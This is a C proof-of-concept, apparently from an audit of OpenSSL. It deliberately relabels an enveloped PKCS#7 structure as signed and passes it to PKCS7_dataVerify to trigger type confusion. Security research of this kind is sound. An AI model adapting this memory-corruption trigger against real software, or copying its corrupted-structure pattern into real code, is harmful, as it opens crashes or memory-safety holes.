/*
 * PoC for SF11: Type confusion via mismatched PKCS#7 type OID in PKCS7_dataVerify
 *
 * PKCS7_dataVerify branches on p7->type OID. If type says signed, it accesses
 * p7->d.sign->cert but if d actually contains enveloped data, we get type confusion.
 */
#include <openssl/pkcs7.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/objects.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/x509_vfy.h>
#include <string.h>
#include <stdio.h>

static EVP_PKEY *make_rsa_key(void) {
    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!pctx) return NULL;
    if (EVP_PKEY_keygen_init(pctx) <= 0) goto err;
    if (EVP_PKEY_CTX_set_rsa_keygen_bits(pctx, 1024) <= 0) goto err;
    EVP_PKEY_keygen(pctx, &pkey);
err:
    EVP_PKEY_CTX_free(pctx);
    return pkey;
}

static X509 *make_cert(EVP_PKEY *pkey) {
    X509 *cert = X509_new();
    if (!cert) return NULL;
    X509_set_version(cert, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(cert), 1);
    X509_gmtime_adj(X509_get_notBefore(cert), 0);
    X509_gmtime_adj(X509_get_notAfter(cert), 31536000L);
    X509_set_pubkey(cert, pkey);
    X509_NAME *name = X509_get_subject_name(cert);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
        (unsigned char *)"Test", -1, -1, 0);
    X509_set_issuer_name(cert, name);
    X509_sign(cert, pkey, EVP_sha256());
    return cert;
}

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    /* Create an enveloped PKCS7 structure */
    PKCS7 *p7 = PKCS7_new();
    PKCS7_set_type(p7, NID_pkcs7_enveloped);
    PKCS7_set_cipher(p7, EVP_aes_128_cbc());

    EVP_PKEY *pkey = make_rsa_key();
    X509 *cert = make_cert(pkey);
    PKCS7_add_recipient(p7, cert);

    /* Now switch the type to "signed" to cause type confusion */
    ASN1_OBJECT_free(p7->type);
    p7->type = OBJ_nid2obj(NID_pkcs7_signed);

    /* Create a fake signer_info for PKCS7_dataVerify */
    PKCS7_SIGNER_INFO *si = PKCS7_SIGNER_INFO_new();
    if (!si) {
        fprintf(stderr, "PKCS7_SIGNER_INFO_new failed\n");
        goto cleanup;
    }

    /* Set up si with minimal valid-looking data */
    si->digest_alg->algorithm = OBJ_nid2obj(NID_sha256);
    si->issuer_and_serial->issuer = X509_get_subject_name(cert);
    si->issuer_and_serial->serial = X509_get0_serialNumber(cert);

    X509_STORE *store = X509_STORE_new();
    X509_STORE_add_cert(store, cert);
    X509_STORE_CTX *ctx = X509_STORE_CTX_new();

    BIO *bio = BIO_new(BIO_s_mem());
    BIO_write(bio, "test data", 9);

    fprintf(stderr, "Calling PKCS7_dataVerify with type confusion...\n");
    /* p7->type says signed, but d.sign points to enveloped data */
    int ret = PKCS7_dataVerify(store, ctx, bio, p7, si);
    fprintf(stderr, "PKCS7_dataVerify returned: %d\n", ret);
    ERR_print_errors_fp(stderr);

    BIO_free_all(bio);
    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);
    si->issuer_and_serial->issuer = NULL; /* avoid double-free */
    si->issuer_and_serial->serial = NULL;
    PKCS7_SIGNER_INFO_free(si);

cleanup:
    X509_free(cert);
    EVP_PKEY_free(pkey);
    return 0;
}
